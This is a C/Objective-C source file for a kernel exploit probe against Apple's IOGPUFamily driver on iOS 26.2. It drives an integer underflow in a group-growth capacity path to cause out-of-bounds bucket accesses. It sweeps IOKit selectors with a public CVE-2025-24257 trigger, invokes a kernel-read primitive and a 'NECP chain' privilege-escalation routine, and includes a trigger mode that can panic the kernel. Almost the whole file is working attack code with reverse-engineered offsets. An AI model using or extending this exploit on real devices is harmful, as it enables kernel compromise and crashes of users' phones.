/* IOGPU group-growth OOB write - focused probe for the SECOND, UNCHECKED
 * capacity path in IOGPUFamily 129.3.2 (iOS 26.2 / 23C55).
 *
 * THE TWO CAPACITY SITES
 *   A) creation path, 0x9f60fcc:
 *          0x9f60fe4: cmp  w2, #0x3f
 *          0x9f60fe8: b.hi 0x9f61028      ; capacity > 63 required
 *          0x9f60fec: mov  w8, #0x40      ; else capacity := 64
 *          0x9f61020: mov  x19, #0        ; ... and return NULL
 *      => the iOS 18.4 fix lives HERE. capacity < 64 is refused.
 *
 *   B) growth path, 0x9f74df8 / 0x9f64910:
 *          0x9f64938: ldr  w8, [x0, #0x20]
 *          0x9f64940: mov  x21, w8        ; count
 *          0x9f649ac: bl   0x9f611ec      ; -> init, capacity = 2*count
 *          0x9f755cc: lsr  w9, w22, #6
 *          0x9f755d0: sub  w9, w9, #1     ; obj+40 = (capacity>>6)-1
 *      => NO lower bound on capacity here. count == 1 -> capacity == 2
 *         -> mask == 0xffffffff.
 *
 *   init @ 0x9f61200 then stores the mask as the bucket index mask of the
 *   group, and the bitmap is only (capacity+63)/8 bytes, so a huge mask
 *   turns every later bucket index into an out-of-bounds access.
 *
 *   Path B is reached from the GROW inside the group object, i.e. when a
 *   resource is ADDED to an existing group. The user-facing entry for that
 *   is the same selector 8 with command 130 (s_group_add_resources,
 *   0x9f606d8) - the fix in (A) does not cover it.
 *
 * COMMANDS inside selector 8 (the group dispatcher 0x9f7314c):
 *   struct[0]  = command
 *     0   -> 0x9f60050  s_new_resource      (guarded, capacity > 63)
 *     3   ->              s_new_resource group (what we already use)
 *     130 -> 0x9f606d8  s_group_add_resources
 *   struct[56] = capacity (cmd 3) / resource handle (cmd 130)
 *   struct[60] = dimension
 *   struct[64] = second dimension
 *   struct[72] = third parameter
 *   struct[24] = pointer to an args blob (>= 16 bytes), NULL is accepted
 *
 * WHAT THIS PROBE DOES
 *   1. new_resource   (cmd 0, capacity 64)  -> capture the returned handle
 *   2. new group      (cmd 3, capacity 64)  -> capture the group pointer
 *   3. add resource   (cmd 130, handle)     -> triggers the growth path
 *   4. read back the group object with the B12 read channel and print
 *      obj+0x20 (count) and obj+0x28 (mask). mask == 0xffffffff after
 *      step 3 == the underflow, live, on this build.
 *
 *   Every step is logged durably BEFORE it runs, so a kernel panic still
 *   leaves the exact step in Documents/group_oob.log.
 */
#import <IOKit/IOKitLib.h>
#import <IOSurface/IOSurfaceRef.h>
#import <dlfcn.h>
#import <CoreFoundation/CoreFoundation.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include "exploit.h"
#include "nk_trace.h"
#include <stdarg.h>

#define ol(fmt, ...) do { nk_log(fmt, ##__VA_ARGS__); \
                            nk_doc_log("group_oob.log", fmt, ##__VA_ARGS__); } while (0)
#define ofile(fmt, ...) nk_doc_log("group_oob.log", fmt, ##__VA_ARGS__)
static uint32_t g_calls;

#define IOGPU_SEL        8u
#define CMD_NEW_RESOURCE 0u
#define CMD_NEW_GROUP   3u
#define CMD_ADD_RES    130u
#define STRUCT_SZ      0x100u

static uint8_t g_args[64];
static uint8_t g_outbuf[0x200];
static uint8_t *g_last_out = g_outbuf;

static void build(uint8_t *in, uint32_t cmd, uint64_t f56, uint64_t f60,
                  uint64_t f64, uint64_t f72)
{
    memset(in, 0, STRUCT_SZ);
    uint64_t c = cmd;
    memcpy(in + 0, &c, 8);
    memcpy(in + 56, &f56, 8);
    memcpy(in + 60, &f60, 8);
    memcpy(in + 64, &f64, 8);
    memcpy(in + 72, &f72, 8);
    /* struct[80] is the w27 gate of the new_resource path (0x9f600dc:
     * cbz w26 -> fail). It must be non-zero. */
    uint64_t w27 = 1;
    memcpy(in + 80, &w27, 8);
    /* struct[24] is a pointer to a >= 16 byte args blob (0x9f600c8: cmp x3,#16). */
    uintptr_t ap = (uintptr_t)g_args;
    memcpy(in + 24, &ap, 8);
}

static int call_sel2(io_connect_t conn, uint32_t cmd, uint32_t surf_off,
                     uint64_t surf_val, uint64_t cap)
{
    static uint8_t in[STRUCT_SZ];
    memset(in, 0, STRUCT_SZ);
    uint64_t c = cmd;
    memcpy(in + 0, &c, 8);
    if (surf_off + 8 <= STRUCT_SZ) memcpy(in + surf_off, &surf_val, 8);
    memcpy(in + 56, &cap, 8);
    uint64_t w27 = 1;
    memcpy(in + 80, &w27, 8);
    uintptr_t ap = (uintptr_t)g_args;
    memcpy(in + 24, &ap, 8);
    static uint8_t out[0x200];
    size_t on = sizeof(out);
    memset(out, 0, on);
    kern_return_t kr = IOConnectCallStructMethod(conn, IOGPU_SEL, in, STRUCT_SZ, out, &on);
    g_last_out = out;
    return (int)kr;
}

static int call_sel(io_connect_t conn, uint32_t cmd, uint64_t f56, uint64_t f60,
                    uint64_t f64, uint64_t f72, uint8_t *out, size_t *outn)
{
    static uint8_t in[STRUCT_SZ];
    build(in, cmd, f56, f60, f64, f72);
    *outn = *out ? *outn : 0;
    size_t on = 0x200;
    memset(out, 0, on);
    kern_return_t kr = IOConnectCallStructMethod(conn, IOGPU_SEL, in, STRUCT_SZ, out, &on);
    *outn = on;
    return (int)kr;
}


/* ------------------------------------------------------------------ */
/* PoC-exact mode: the published CVE-2025-24257 trigger, swept over EVERY  */
/* selector and both user-client types.                                 */
/*                                                                       */
/* The public PoC (wh1te4ever/xnu_1day_practice, CVE-2025-24257/poc.c):   */
/*   struct[0]    = 3              (IOGPUResource::newResourceGroup)       */
/*   struct[0x38] = capacity       (1 => panic; 1,2,4,8,0x10,0x20 panic) */
/*   output+0x10  = group pointer                                       */
/*   selector 10, user-client type 5                                    */
/*   the panic happens when the group is DESTROYED (process exit), so    */
/*   closing the connection is part of the trigger.                       */
/*                                                                       */
/* On 23C55 the table was reorganised (two 56-entry tables, sel 64 only   */
/* on type 33), so the selector is swept instead of assumed.              */
/* ------------------------------------------------------------------ */
static void poc_exact_sweep(io_connect_t conn, uint32_t type)
{
    static const uint32_t caps[] = { 1, 2, 4, 8, 0x10, 0x20, 0x40 };
    static uint8_t in[0x400];
    static uint8_t out[0x400];

    for (uint32_t sel = 0; sel < 128; sel++) {
        for (uint32_t ci = 0; ci < sizeof(caps)/sizeof(caps[0]); ci++) {
            memset(in, 0, sizeof(in));
            memset(out, 0, sizeof(out));
            uint64_t three = 3;
            memcpy(in + 0x00, &three, 8);
            uint32_t cap = caps[ci];
            memcpy(in + 0x38, &cap, 4);

            ofile("[poc] CALL type=%u sel=%u cap=0x%x", type, sel, cap);
            size_t on = sizeof(out);
            kern_return_t kr = IOConnectCallStructMethod(conn, sel, in, sizeof(in), out, &on);
            g_calls++;
            if (kr == KERN_SUCCESS) {
                uint64_t grp = 0;
                memcpy(&grp, out + 0x10, 8);
                ofile("[poc] *** CREATED type=%u sel=%u cap=0x%x grp=0x%016llx  (closing conn -> destructor -> bitmap walk)",
                      type, sel, cap, (unsigned long long)grp);
                nk_log("[poc] *** CREATED type=%u sel=%u cap=0x%x grp=0x%016llx",
                       type, sel, cap, (unsigned long long)grp);
                /* closing the connection destroys the group: that is where the
                   underflowed bitmap mask is walked. */
                IOServiceClose(conn);
                ofile("[poc] conn closed (group destroyed)");
                return;
            } else if (kr != (kern_return_t)0xe00002c2 && kr != (kern_return_t)0xe00002c7) {
                ofile("[poc] kr=0x%x type=%u sel=%u cap=0x%x", kr, type, sel, cap);
            }
        }
    }
}

void nk_iogpu_group_oob_run(int trigger)
{
    nk_doc_log_open("group_oob.log");
    ol("[grp] === IOGPU group-growth OOB probe (23C55) mode=%s ===",
       trigger ? "TRIGGER" : "READ-ONLY");
    ol("[grp] durable log: Documents/group_oob.log");
    if (!trigger) ol("[grp] READ-ONLY: steps 1+2 only, no add-resource, no crash");

    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                    IOServiceMatching("IOGPU"));
    if (!svc) { ol("[grp] no IOGPU service"); return; }

    io_connect_t conn = MACH_PORT_NULL;
    uint32_t use_type = 0; (void)use_type;
    for (uint32_t t = 0; t <= 40 && !conn; t++) {
        io_connect_t c = MACH_PORT_NULL;
        if (IOServiceOpen(svc, mach_task_self(), t, &c) == KERN_SUCCESS && c) {
            conn = c; use_type = t;
            ol("[grp] OPEN IOGPU type=%u", t);
        }
    }
    if (!conn) { ol("[grp] no usable type"); return; }

    static uint8_t out[0x200];
    size_t on = 0;

    /* The readback needs the B12/NECP kernel-read channel. Bring it up here
     * so the probe is self-contained (requires the unsafe_necp_dataonly pref
     * in Settings -> Privilege Escalation). */
    {
        uint8_t probe[8];
        int rr = nk_do_kread(0xdeadbeef0000ULL, probe, sizeof(probe));
        if (rr != 0) {
            ol("[grp] read channel down (kr=%d) - running the NECP chain", rr);
            nk_dataonly_necp_chain();
            rr = nk_do_kread(0xdeadbeef0000ULL, probe, sizeof(probe));
            ol("[grp] read channel after chain: kr=%d", rr);
            if (rr != 0) ol("[grp] WARNING: no kernel read channel; the mask check will not work");
        } else {
            ol("[grp] read channel already up");
        }
    }

    int kr = 0;

    /* A surface and its global id: the kernel registers IOSurfaces as
       resources, and the cmd-130 lookup compares element->0x10 with the key,
       so the surface's global id is a prime key candidate. */
    uint32_t surf_id = 0;
    IOSurfaceRef surf = NULL;
    {
        CFNumberRef w  = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){1});
        CFNumberRef h  = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){0x1000});
        CFNumberRef bpe= CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){4});
        CFNumberRef pf = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){0x42475241});
        const void *keys[]   = { kIOSurfaceWidth, kIOSurfaceHeight, kIOSurfaceBytesPerElement, kIOSurfacePixelFormat };
        const void *values[] = { w, h, bpe, pf };
        CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, values, 4,
                                                  &kCFTypeDictionaryKeyCallBacks,
                                                  &kCFTypeDictionaryValueCallBacks);
        surf = IOSurfaceCreate(props);
        CFRelease(props); CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(pf);
        uint32_t (*getid)(IOSurfaceRef) = (uint32_t (*)(IOSurfaceRef))dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
        if (getid && surf) surf_id = getid(surf);
        ol("[grp] IOSurface=%p global id=%u", (void *)surf, surf_id);
    }

    if (trigger) {
        /* DIRECT GROW on a FRESH connection.
           0x10000003 = MACH_SEND_INVALID_DEST: the IOGPU user client dies
           when a group is destroyed (on 18.3 that was the kernel panic; on
           26.2 the client is torn down). So the connection must be fresh, and
           the grow test must run BEFORE anything else. */
        ol("[grp] DIRECT GROW on a fresh connection");

        /* two groups: cmd 3, capacity 64 (the only accepted capacity) */
        uint64_t grpA = 0, grpB = 0;
        static uint8_t out2[0x200];
        size_t on2 = 0;
        for (int g = 0; g < 2; g++) {
            int k2 = call_sel(conn, CMD_NEW_GROUP, 64, surf_id, 0, 0, out2, &on2);
            uint64_t p2 = 0;
            if (k2 == 0) memcpy(&p2, out2 + 0x10, 8);
            ol("[grp] group %d -> kr=0x%x ptr=0x%016llx", g, k2, (unsigned long long)p2);
            if (g == 0) grpA = p2; else grpB = p2;
        }
        if (!grpA) {
            ol("[grp] no group created (kr=0x%x) - cannot drive the growth path", 0x10000003);
        } else {
            /* the array element may be a GROUP (type byte == 3), so the handle
               in struct[56] can be a group pointer. Sweep: small indices,
               then both group pointers, then the pointer of the other group. */
            uint64_t keys[300];
            uint32_t nk = 0;
            for (uint32_t k = 0; k < 256; k++) keys[nk++] = k;
            keys[nk++] = grpA;
            keys[nk++] = grpB;
            if (surf_id) keys[nk++] = surf_id;      /* surface global id */
            keys[nk++] = (uint64_t)(uintptr_t)surf; /* surface ref pointer */
            for (uint32_t k = 0; k < nk; k++) {
                ol("[grp] GROW key[%u] = 0x%016llx", k, (unsigned long long)keys[k]);
                kr = call_sel(conn, CMD_ADD_RES, keys[k], 1, 0, 0, out, &on);
                ol("[grp] GROW key[%u] -> kr=0x%x", k, kr);
                if (kr == 0 || kr == (int)0x10000003) {
                    if (kr == 0) {
                        ol("[grp] *** GROW key[%u] ACCEPTED (kr=0) - closing to destroy "
                           "the group (underflowed bitmap walk)", k);
                    } else {
                        ol("[grp] *** GROW key[%u] -> client died (0x10000003 INVALID_DEST) "
                           "- the group destructor already tripped", k);
                    }
                    IOServiceClose(conn);
                    ol("[grp] connection closed");
                    return;
                }
            }
            ol("[grp] GROW: no key accepted");
        }

        /* PoC-exact sweep last: it destroys the client when a group is
           created and closed, so it must not run before the grow test. */
        ol("[grp] PoC-exact sweep (after grow test)");
        poc_exact_sweep(conn, use_type);
        ol("[grp] PoC-exact sweep done (calls=%u)", g_calls);
    }

    /* ---- step 1: create a RESOURCE.
       The group (type 3) creates fine, but every other type answers
       kIOReturnNoResources - a resource needs an IOSurface. The public
       24257 PoC creates one. We build a 1x0x1000 BGRA surface and then
       sweep: resource type x struct offset x how the surface is passed
       (global id / mach port name / ref pointer). Whatever returns
       success with a small integer is the resource handle cmd=130 wants
       in struct[56]. */
    uint64_t handle = 0;
    uint32_t res_type = 0;
    static const uint32_t off_list[] = { 8, 16, 24, 32, 40, 48, 56, 64, 72, 80 };
    for (uint32_t t = 1; t <= 16; t++) {
        if (t == 3) continue;                 /* 3 = group, handled in step 2 */
        for (uint32_t oi = 0; oi < sizeof(off_list)/sizeof(off_list[0]); oi++) {
            uint32_t off = off_list[oi];
            for (uint32_t form = 0; form < 4; form++) {
                uint64_t val = 0;
                switch (form) {
                    case 0: val = surf_id; break;                       /* global id */
                    case 1: val = (uint64_t)(uintptr_t)surf; break;      /* ref pointer */
                    case 2: val = surf_id; break;                       /* id + capacity */
                    case 3: val = (uint64_t)(uintptr_t)surf; break;      /* ptr + capacity */
                }
                kr = call_sel2(conn, t, off, val, (form >= 2) ? 64 : 0);
                if (kr == 0) {
                    ol("[grp] STEP 1 HIT type=%u off=0x%x form=%u val=0x%llx", t, off, form, (unsigned long long)val);
                    for (uint32_t w = 0; w + 8 <= 0x40; w += 8) {
                        uint64_t v = 0;
                        memcpy(&v, g_last_out + w, 8);
                        ol("[grp]   out[+0x%02x]=0x%016llx", w, (unsigned long long)v);
                    }
                    handle = 0;
                    for (uint32_t w = 0; w + 8 <= 0x40; w += 8) {
                        uint64_t v = 0;
                        memcpy(&v, g_last_out + w, 8);
                        if (v && v < 0x10000) { handle = v; break; }
                    }
                    if (handle) { res_type = t; break; }
                }
            }
            if (handle) break;
        }
        if (handle) break;
    }
    ol("[grp] STEP 1 result: resource type=%u handle=0x%llx", res_type, (unsigned long long)handle);
    if (!handle) ol("[grp] STEP 1: no resource type/offset/form produced a handle");

    /* ---- step 2: new group (cmd 3) with capacity 64 ---- */
    ol("[grp] STEP 2 new_group cmd=3 cap=64");
    kr = call_sel(conn, CMD_NEW_GROUP, 64, 0, 0, 0, out, &on);
    ol("[grp] STEP 2 -> kr=0x%x outN=%zu", kr, on);
    uint64_t grp = 0;
    for (uint32_t w = 0; w + 8 <= 0x40 && w < on; w += 8) {
        uint64_t v = 0;
        memcpy(&v, out + w, 8);
        ol("[grp]   out[+0x%02x]=0x%016llx", w, (unsigned long long)v);
    }
    memcpy(&grp, out + 0x10, 8);
    ol("[grp] STEP 2 group ptr = 0x%016llx", (unsigned long long)grp);

    /* ---- step 4 (read back the group BEFORE any add) ---- */
    if (grp) {
        uint8_t obj0[0x40];
        memset(obj0, 0, sizeof(obj0));
        int r0 = nk_do_kread(grp, obj0, sizeof(obj0));
        ol("[grp] PRE-ADD read -> %d", r0);
        if (r0 == 0) {
            uint32_t c0 = 0, m0 = 0;
            memcpy(&c0, obj0 + 0x20, 4);
            memcpy(&m0, obj0 + 0x28, 4);
            ol("[grp] PRE-ADD obj+0x20 count=%u  obj+0x28 MASK=0x%08x", c0, m0);
        }
    }

    if (!trigger) {
        ol("[grp] READ-ONLY done (use the TRIGGER button to drive the growth path)");
        IOServiceClose(conn);
        return;
    }

    /* ---- step 3: add the resource to the group -> growth path ---- */
    ol("[grp] TRIGGER: adding the resource to the group; this may panic the kernel");
    for (uint32_t h = 0; h < 12; h++) {
        uint64_t cand = (h == 0) ? handle : h;
        ol("[grp] STEP 3 add_resource cmd=130 handle=%llu", (unsigned long long)cand);
        kr = call_sel(conn, CMD_ADD_RES, cand, 1, 0, 0, out, &on);
        ol("[grp] STEP 3 -> kr=0x%x outN=%zu", kr, on);
        if (kr == 0) {
            for (uint32_t w = 0; w + 8 <= 0x40 && w < on; w += 8) {
                uint64_t v = 0;
                memcpy(&v, out + w, 8);
                ol("[grp]   out[+0x%02x]=0x%016llx", w, (unsigned long long)v);
            }
            break;
        }
    }

    /* ---- step 4: read the group object back ---- */
    if (grp) {
        ol("[grp] STEP 4 read group object");
        uint8_t obj[0x80];
        memset(obj, 0, sizeof(obj));
        int r = nk_do_kread(grp, obj, sizeof(obj));
        ol("[grp] STEP 4 kread -> %d", r);
        if (r == 0) {
            uint32_t count = 0, mask = 0;
            memcpy(&count, obj + 0x20, 4);
            memcpy(&mask, obj + 0x28, 4);
            ol("[grp]   obj+0x20 count=%u", count);
            ol("[grp]   obj+0x28 MASK=0x%08x %s", mask,
               mask == 0xffffffffu ? "<<< UNDERFLOW LIVE" : "");
            for (uint32_t w = 0; w + 8 <= sizeof(obj); w += 8) {
                uint64_t v = 0;
                memcpy(&v, obj + w, 8);
                ol("[grp]   obj[+0x%02x]=0x%016llx", w, (unsigned long long)v);
            }
        }
    } else {
        ol("[grp] no group pointer, skipping readback");
    }
    IOServiceClose(conn);
    ol("[grp] === done ===");
}
